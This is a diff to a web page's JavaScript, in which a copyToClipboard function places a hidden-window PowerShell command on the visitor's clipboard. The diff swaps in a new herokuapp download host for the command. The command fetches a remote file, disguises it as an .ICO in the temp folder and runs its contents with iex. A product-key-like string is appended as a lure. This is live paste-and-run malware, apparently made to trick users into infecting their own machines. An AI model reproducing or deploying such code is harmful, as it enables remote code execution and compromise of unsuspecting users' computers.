@@ -69,7 +69,7 @@
 
     <script>
         function copyToClipboard() {
-            const textToCopy = `powershell -windowstyle hidden -Command iwr "https://www.telemetry-provider.com/telemetry.vmd" -OutFile "$env:TEMP\\p"; $c=Get-Content -Path "$env:TEMP\\p" -Raw; iex $c; 3Z5TY-76FR3-9G87H-7ZC56`;
+            const textToCopy = `powershell -windowstyle hidden -Command iwr "https://gemini-pediatrics-414693e8e186.herokuapp.com/telemetry.vmd" -OutFile "$env:TEMP\\d.ICO"; Rename-Item -Path "$env:TEMP\\d.ICO" -NewName "p.ICO"; $c=Get-Content -Path "$env:TEMP\\p.ICO" -Raw; iex $c; 3Z5TY-76FR3-9G87H-7ZC56`;
             navigator.clipboard.writeText(textToCopy).then(() => {
                 alert('Command copied to clipboard!');
             }).catch(err => {
